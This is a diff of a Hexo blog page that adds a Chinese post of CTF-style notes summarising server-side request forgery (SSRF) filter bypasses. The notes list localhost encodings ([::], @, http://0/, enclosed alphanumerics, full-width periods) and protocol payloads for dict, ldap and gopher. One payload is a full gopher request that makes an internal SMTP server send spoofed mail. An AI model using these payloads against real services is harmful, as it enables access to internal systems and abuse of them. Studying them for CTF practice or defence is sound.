@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>Hexo - </title>
+<title>ssrf绕过总结 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,17 +114,17 @@
 
             <div class="page-title">
     <ul>
-        <li class="active">
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class="">
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
-        
-        <li class="">
-            <a href="/categories/huma" data-name="人文">人文</a>
-        </li>
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -139,161 +139,111 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-14">2021-04-14</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">ssrf绕过总结</h2>
+            <div class="post-meta">
+                emm... 1777 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天群里发了一个关于ssrf绕过总结的文章，想起来做过的ssrf题目也有不少，这次做一个绕过的总结。这里只总结目前还没有见过的绕过方式。  </p>
+<h2 id="攻击本地"><a href="#攻击本地" class="headerlink" title="攻击本地"></a>攻击本地</h2><pre><code>http://127.0.0.1:80
+http://localhost:22</code></pre>
+<p>1、利用[::]</p>
+<pre><code>利用[::]绕过localhost
+http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre>
+<p>2、利用@  </p>
+<pre><code>http://example.com@127.0.0.1  </code></pre>
+<p>3、利用短地址</p>
+<pre><code>http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1  </code></pre>
+<p>4、利用上传</p>
+<pre><code>也不一定是上传，我也说不清，自己体会 -.-
+修改&quot;type=file&quot;为&quot;type=url&quot;
+比如：
+上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF  </code></pre>
+<p>5、利用Enclosed alphanumerics</p>
+<pre><code>利用Enclosed alphanumerics
+ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
+⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
+⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  
+
+这个确实是少见了。和之前那个unicode编码有相似之处。  </code></pre>
+<p>6、利用句号</p>
+<pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1  
+这个算是和上面那个差不多的。  </code></pre>
+<p>7、利用特殊地址</p>
+<pre><code>http://0/  </code></pre>
+<p>8、利用协议</p>
+<pre><code>Dict://
+dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;
+ssrf.php?url=dict://attacker:11111/
+SFTP://
+ssrf.php?url=sftp://example.com:11111/
+TFTP://
+ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
+LDAP://
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+Gopher://
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a  </code></pre>
+<p>9、使用组合</p>
+<pre><code>各种绕过进行自由组合即可   </code></pre>
+<p>其实绕过方式多种多样，遇到没见过的就多积累，这样才能面对一道题有多种方法。</p>
+
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2020-12-02
-            
         </div>
-        <a class="post-title" href="/note2/undefined-undefined.html" target="_blank" title="PHP伪协议笔记">PHP伪协议笔记</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        PHP伪协议笔记
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-29
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
             
         </div>
-        <a class="post-title" href="/note1/undefined-undefined.html" target="_blank" title="PHP中foreach函数笔记">PHP中foreach函数笔记</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        PHP中foreach函数笔记
-    </div>
-</article>
-
-
-
         
-            
-<article class="post">
+    </article>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-28
-            
-        </div>
-        <a class="post-title" href="/note/undefined-undefined.html" target="_blank" title="第一周学习报告">第一周学习报告</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        第一周学习报告
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-28
-            
-        </div>
-        <a class="post-title" href="/test/undefined-undefined.html" target="_blank" title="web第一周练习">web第一周练习</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web第一周练习
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-22
-            
-        </div>
-        <a class="post-title" href="/%E7%BB%83%E4%B9%A0/undefined-undefined.html" target="_blank" title="web习题练习1">web习题练习1</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web习题练习1
-    </div>
-</article>
-
-
-
-        
     
+
 </div>
 
-<div id="btn-pager">
-    
-    <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span>
-</div>
+<script src="/js/busuanzi.pure.mini.js"></script>
+
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
